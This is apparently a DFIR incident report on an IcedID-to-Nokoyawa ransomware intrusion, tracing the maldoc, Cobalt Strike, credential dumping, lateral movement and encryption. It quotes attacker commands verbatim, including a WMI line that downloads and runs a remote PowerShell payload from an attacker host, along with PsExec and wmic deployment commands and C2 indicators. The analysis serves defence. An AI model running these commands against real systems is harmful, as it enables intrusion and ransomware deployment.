# Case summary
This intrusion began with a malicious Excel document. We assess with medium-high confidence that this document was delivered as part of a malicious email campaign during the first half of October 2022, based on public reporting that overlaps with multiple characteristics observed. Upon opening the Excel document, the macros would be executed when a user clicked on an embedded image. The macro code was responsible for downloading and writing an IcedID DLL payload to disk. The macro then used a renamed rundll32 binary to execute the malicious DLL.

After reaching out to the initial command and control server, automated discovery ran from the IcedID process around two minutes after execution. This discovery used the same suite of Microsoft binaries as we have previously reported for the IcedID malware family. At this time, the malware also established persistence on the beachhead host using a scheduled task.

Around two hours after the initial malware ran, IcedID loaded several Cobalt Strike beacons on the beachhead. Within minutes of running Cobalt Strike on the beachhead the threat actors proceeded to elevate to SYSTEM permissions and dump LSASS memory using the beacons. Following this activity, the threat actors conducted further reconnaissance, and then moved laterally to a Domain Controller through the execution of a Cobalt Strike payload via WMI.

Next, discovery tasks continued from the beachhead host, including network scans for port 1433 (MSSQL) and browsing network shares with an interest in password files. The threat actors appeared to have removed some contents of the network shares off the network as canary files report the documents being opened off network minutes later. After this, the threat actors remained quiet over the next several days.

On the fourth day, the threat actors returned briefly to execute a few commands on the Domain Controller related to the enumeration of domain computers and high privilege user account groups. Privilege escalation was also observed on the system via named pipe impersonation.

Early on the sixth day, the threat actors became active again launching the Edge browser on the beachhead host and appeared to download a file from dropmefiles[.]com. But after completing this, they went silent again for around another eight hours. Then, from the beachhead host, a new process was spawned from the IcedID malware; and from this shell, the threat actors began enumerating Active Directory using adget and AdFind.

The threat actors then began to spread laterally using a combination of Cobalt Strike beacon DLLs, batch scripts, and WMI commands. More credential dumping was observed, followed by additional AdFind and other Windows discovery commands. The threat actors then continued lateral movement and began checking RDP access across the environment. A batch file was run enumerating hostnames throughout the environment using nslookup. Some further pivoting around systems and targeted discovery continued throughout the rest of the day.

On the seventh day, around 23 hours since the last activity in the environment the threat actors began the final phase of the intrusion. The threat actors connected to a compromised server via RDP. From this server they would stage the ransomware deployment. They deployed the ransomware payload, Sysinternals PsExec, and a cluster of batch files 1.bat-6.bat and p.bat. Opening a command prompt, they moved through executing the batch files copying p.bat, a renamed PsExec, and the ransomware payload to all domain joined hosts. They then used the batch scripts to execute the ransomware payload via PsExec and WMI.

The time to ransomware (TTR) was around 148 hours (~6 days) from the initial infection. After the intrusion, contact was made with the threat actors using their support site and the price of the ransom was quoted around $200,000 USD in Bitcoin. No ransom was paid as a result of this intrusion.

# Analysis

This intrusion is linked to an IcedID malspam campaign that was observed in October 2022 targeting Italian organizations based on overlap in the maldoc template and the IcedID C2 server.

This case involved an IcedID payload delivered through an Excel maldoc containing VBA macros that were linked to the two images embedded in the document, which caused the macros to execute when a user clicks on either of the images:

The macro associated with the maldoc reached out to a hard-coded domain and downloaded the first stage IcedID payload. More on this in the next section.

# IcedID

Once the VBA macro was invoked, Excel connected to the hard-coded domain and downloaded the first stage of the IcedID payload.

When the VBA macro from Excel calls out to the hard-coded domain, it has multiple interesting characteristics, including:
- Two OPTIONS requests followed by a GET request.
- User-agent fields mentioning Microsoft Office.
- Specific HTTP headers such as X-Office-Major-Version , X-MSGETWEBURL , X-IDCRL_ACCEPTED , and UA-CPU .

Once the IcedID payload is successfully retrieved, it will be decoded with Base64 and written to disk. In this case, the payload was written to the path retrieved from Application.DefaultFilePath , which is the default path used by Excel when it opens files.

The random name generated for the IcedID payload may be either 1 to 7 random digits, or 4500 . This is because the Rnd function will return “a value less than 1 but greater than or equal to zero“.

Once the IcedID payload is successfully written to disk, the following post deployment steps are initiated:
- Rundll32.exe is copied into a file named calc.exe under the path returned by Application.DefaultFilePath .
- Calc.exe (renamed rundll32.exe) is used to invoke the IcedID payload.

In this case, rundll32.exe was copied into the user Documents folder and named calc.exe. The name ‘calc.exe’ is hard-coded into the VBA code and will not be changed.

Once the VBA macros invoked the IcedID payload, the parent-child process relationship between Excel and calc.exe was observed.

The following diagram provides a visual summary of the process to execute IcedID on the endpoint.

# IcedID VNC

The threat actors were observed making use of an VNC module that was spawned by IcedID to spawn the Microsoft Edge browser:

We were able to reconstruct some of the VNC traffic thanks to @0xThiebaut‘s tool PCAPeek. You can see the below options such as Edge, Chrome, Firefox, CMD, Task Manager and run dialog. Based on the visual it appears to be the KeyHole VNC module reported first observed in Oct 2022 by NVISO.

In another instance, a run dialog was observed being used to execute the calc.exe file that was created earlier. More information can be found about this here.

However, the command below would have no effect in this case as calc.exe is a renamed version of rundll32 and no parameters were passed.

Several other programs were seen run in this manner, as seen in process execution logs below:

# Cobalt Strike

The threat actors used Cobalt Strike beacons throughout the intrusion. The first beacon was executed via PowerShell, which in turn was executed initially by a command shell which was started by the IcedID malware at the same time a DLL beacon was also executed.

The downloaded PowerShell payload, previously hosted on hxxps://aicsoftware[.]com:757/coin, is available on VirusTotal. Here is the content of the payload, where we can observe an object being created in memory using an encoded string. We will walk through decoding this string to view the Cobalt Strike configuration present within.

After initial Base64 decoding, we found the payload used the default Cobalt Strike XOR value of 35 which allows for the next step of decoding the payload.

# Second stage decoding:

After this an MZ header can be observed. From there, the data can be saved and reviewed using 1768.py from Didier Stevens, revealing the Cobalt Strike configuration embedded within:

After using PowerShell beacons during the first day on the beachhead host and a Domain Controller, the threat actors moved to using DLL files exclusively for the remainder of Cobalt Strike beacons deployed during the intrusion. Other notable executions included the use of batch files:

C:\Windows\system32\cmd.exe /c c:\windows\temp\1.bat -> rundll32.exe c:\windows\temp\1.dll, DllRegisterServer

During the initial execution of IcedID, the following two files were created under the AppData Roaming folder of the user that executed it:
- exdudipo.dll : IcedID first stage.
- license.dat: Encoded version of the second stage which the first stage will load into memory.

A scheduled task was created that contained instructions on executing the IcedID DLL and the location of the license.dat file. This is a very common method that IcedID has used for persistence.



The scheduled task was configured to execute every hour.

Privilege escalation was completed on two systems via the named pipe GetSystem feature within the Cobalt Strike tool. An example is shown below via Sysmon event ID 1 – ProcessCreate Rule:

This intrusion displayed numerous techniques used by threat actors to evade detection.

# Process Injection

The adversary was seen injecting code into legitimate processes via CreateRemoteThread which can be detected using Sysmon event ID 8.

The table below shows examples of injected processes found via an in memory yara scan using this Malpedia yara rule:

# File Deletion

Files that were dropped in temporary directories were deleted after execution as seen below with Sysmon event ID 11 and 23.

Below is the list of files seen being created and later deleted by the threat actor:
- 7.exe 
- adfind.bat 
- adfind.exe 
- adget.exe 
- ad.7z 
- 1.bat 
- 1.dll 
- 7.exe 
- ns.bat

# Renamed System Utilities

Adversaries typically rename common Windows system utilities to avoid triggering alerts that monitor utility usage. The table below summaries the renamed utilities observed in this intrusion.

The threat actors were observed accessing a file server, and browsing though files related to passwords. These would later be observed opened off network, more details in the exfiltration section on that activity.

On the second day of the intrusion, after moving laterally to a Domain Controller, LSASS was accessed from a Cobalt Strike process. The access granted value 0x1010 was observed. As noted in a previous report, this value matches known mimikatz access patterns. This logged event suggests Cobalt Strike accessed LSASS to dump credentials from memory. This activity was observed again on various hosts on the fourth and sixth days of the intrusion.

The discovery phase primarily utilized built-in Windows tools. One utility seen was chcp which allows you to display or set the code page number. The default chcp value is determined by the Windows locale. The locale can indicate the language, country, and regional standards of that host (e.g. date and time formatting). After viewing the default page code, the adversary did change the value to 65001 to reflect the UTF-8 character set. We have seen this as a technique employed by IcedID for some time as reported in depth in prior cases.

Following the initial discovery commands mentioned above on day one, the threat actor scanned the network for port 1433, the default port used by Microsoft SQL server.

The discovery phase remained minimal leading into day six. The threat actors were seen dropping AdFind and adget.exe to reveal all users, groups, computers, organizational units, subnets, and trust objects within the domain.

Adget is a newer tool that we first observed in this previous report but generally this tool performs similar AD discovery as AdFind.

Following the Active Directory discovery activity, additional remote discovery actions were observed using WMI to gather information about Windows OS version and licensing on the hosts.

C:\Windows\system32\cmd.exe /C wmic /node:"REDACTED" /user:"USER" /password:"REDACTED" os get caption

Then another recon round occurred using NSLOOKUP to map assets to IP addresses.

This was followed by network scans for RDP:

During this intrusion, threat actors used a number of different techniques to move laterally across the domain. The techniques used will be detailed in the following sections.

# T1021.006 Remote Services: WinRM

Some of the threat actors’ lateral activity was executed using WinRM, this could be observed by matching parent-child process trees and DCE RPC traffic.

# T1047 WMI

Threat Actors ran the following command to download and execute an in memory PowerShell payload on a domain controller:

C:\\Windows\\System32\\wbem\\wmic.exe /node:REDACTED process call create \""cmd.exe /c powershell.exe -nop -w hidden -c \""\""IEX ((new-object net.webclient).downloadstring('https://aicsoftware[.]com:757/coin'))\""\"""

WMI was also used also when executing remote DLL beacons:

C:\Windows\system32\cmd.exe /C wmic /node:"REDACTED" process call create "c:\windows\system32\rundll32.exe c:\windows\temp\1.dll, DllRegisterServer

WMI commands were also observed during ransom deployment:

wmic /node:REDACTED /user:DOMAIN\USER /password:REDACTED process call create cmd.exe /c copy \\REDACTED\c$\windows\temp\p.bat c:\windows\temp

# T1021.002 Remote Services: SMB/Windows Admin Shares

The threat actors relied on SMB to move their tools throughout the network during the intrusion.

The threat actors used PSExec to move laterally to servers during the ransom execution, the -r flag was used to rename the binary created on the remote server to mstdc.exe .

Below are some of the PsExec forensic artifacts logged in Windows Event Logs and Sysmon:

Overview of the mstdc.exe binary (renamed psexecsvc.exe):

Renaming PsExec is likely an action taken by threat actors to bypass basic PsExec anomaly rules. However, there are Sigma rules which detect this specific technique, as shared by Florian Roth back in 2019.

They also employed use of the Windows copy utility to move files around the network via SMB:

cmd.exe /c copy \\REDACTED\c$\windows\temp\p.bat c:\windows\temp\

# T1021.001 Remote Services: RDP

Threat actors also used RDP during this intrusion. Below is an example of forensic artifacts left after using RDP to move laterally from the beachhead to one of the domain servers logged in Windows Event Logs using different providers:

During discovery actions, the threat actors were observed using 7-Zip to archive data collected from active directory using AdFind.

7.exe a -mx3 ad.7z ad_*

# IcedID

In this case IcedID was observed with the campaign ID of 3298576311 communicating with a C2 server located at kicknocisd[.]com.

Suricata Rule Name Domain IP AS ORG Country ET MALWARE Win32/IcedID Request Cookie kicknocisd[.]com 159.65.169[.]200 DIGITALOCEAN-ASN United States

After initial connections, IcedID command and control traffic moved to the following servers.

Connections to one of the IcedID servers was observed in memory dumps from the beachhead host. This evidence is consistent with the connections to 45.66.248[.]119 observed from the renamed rundll32.exe that loaded the IcedID DLL during maldoc execution at the beginning of this case.

# BackConnect VNC

During the intrusion we also observed connections to a BackConnect VNC IP address. These connections were also spawned from the running IcedID process on the beachhead host.

Alerts from Lenny Hansson‘s ruleset fired on the traffic for the following alerts:



Here’s another look at the VNC GUI from the attackers standpoint.

In the execution section we covered utilities launched by the threat actors from the VNC activity.

# Web Service

On the sixth day, the threat actors launched an Edge browser on the beachhead host, via VNC as described in the execution section, and connected to the site dropmefiles[.]com a site that offers free file transfer services. Data connections from the Edge browser in the SRUMDB indicate that a file download occurred but we were unable to determine what the file was or its purpose related to the intrusion.

# Cobalt Strike

# T1071 / S0154

The threat actors dropped and executed a malicious DLL, p1.dll, on the beachhead. This malicious DLL is a Cobalt Strike beacon reaching out to 23.29.115.152/aicsoftware[.]com on ports 757 and 8080. Later the threat actors also injected further beacons into memory reaching out to 50.3.132.232 /iconnectgs[.]com on port 8081. Later on day six, the threat actors added a new Cobalt Strike server to the intrusion, 5.8.18.242 on port 443 (see below for visualizing this activity).

# Beaconing

Below is a screenshot of a packet captured from C2 traffic over HTTP. Encrypted POST requests made to iconnectgs[.]com (50.3.132[.]232) are seen:

# Cobalt Strike Configurations



During the intrusion, the threat actors targeted password documents on network shares. We observed these being taken and opened off network through the use of canaries. No overt exfiltration was observed so we assess that this occurred over existing command and control channels.

The threat actors opened the document from the IP:

45.61.139.126

Threat Actors deployed Nokoyawa ransomware from one of the servers using WMI and PsExec. They first copied the ransomware binary,k.exe, and a batch script p.bat using WMI:

wmic /node:"TARGET_HOST_IP" /user:"DOMAIN\USER" /password:"PASSWORD" process call create "cmd.exe /c copy \\SOURCE_SERVER_IP\c$\windows\temp\p.bat c:\windows\temp\"

Command spawned by WmiPrvSE.exe:

cmd.exe /c copy \\SOURCE_SERVER_IP\c$\windows\temp\k.exe c:\windows\temp\

A snippet of SMB network traffic generated by the above command:

The p.bat is a simple batch script that runs the k.exe binary with a Base64 encoded configuration:

c:\windows\temp\k.exe --config REDACTED

The redacted parameter used by the `–config` flag decodes to:



The decoded configuration file shows the ransomware extension, the note name, and the note content encoded in Base64. The threat actors also configured a number of directories and extensions to skip, and enabled network and hidden drives encryption. The DELETE_SHADOW was set to true, in order to delete volume shadow copies.

Based on the configuration parameters being passed via command line and the code written in C++, the deployment appears to be part of the 1.1 version of the Nokoyawa code base:

Ransomware sample code signature:

Debug information shows that the binary was generated a few hours before the encryption:

The ransomware was then deployed at scale using PsExec to encrypt the Windows domain:

psexec.exe \\TARGET_HOST_IP -u DOMAIN\USER -p "PASSWORD" -s -d -h -r mstdc -accepteula -nobanner c:\windows\temp\p.bat

A ransom message was left in each directory where files were encrypted.

After encryption, contact was made with the threat actors using their support site and the price of the ransom was quoted at ~$200,000 USD in Bitcoin. No ransom was paid as a result of this intrusion.

# MITRE ATT&CK DATASET
Access Token Manipulation: Token Impersonation/Theft - T1134.001
Account Discovery: Local Account - T1087.001
Account Discovery: Domain Account - T1087.002
Application Layer Protocol: Web Protocols - T1071.001
Command and Scripting Interpreter: Windows Command Shell - T1059.003
Command-Line Interface: PowerShell - T1059.001
Command-Line Interface: Visual Basic - T1059.005
Data Encrypted for Impact - T1486
Domain Trust Discovery - T1482
File and Directory Discovery - T1083
Indicator Removal on Host: File Deletion - T1070.004
Masquerading: Rename System Utilities - T1036.003
Phishing: Spearphishing Attachment - T1566.001
Process Injection – T1055
Remote Services: RDP - T1021.001
Remote Services: SMB/Windows Admin Shares - T1021.002
Remote System Discovery - T1018
Scheduled Task/Job: Scheduled Task - T1053.005
System Binary Proxy Execution: Rundll32 - T1218.011
System Network Configuration Discovery - T1016
Valid Accounts - T1078
WMI - T1047
Unsecured Credentials: Credentials In Files - T1552.001
User Execution: Malicious File - T1204.002
Remote Services: Windows Remote Management - T1021.006
Exfiltration Over C2 Channel - T1041
Archive Collected Data: Archive via Utility - T1560.001
Ingress Tool Transfer - T1105
Web Service - T1102
OS Credential Dumping: LSASS Memory - T1003.001
Remote Access Software - T1219
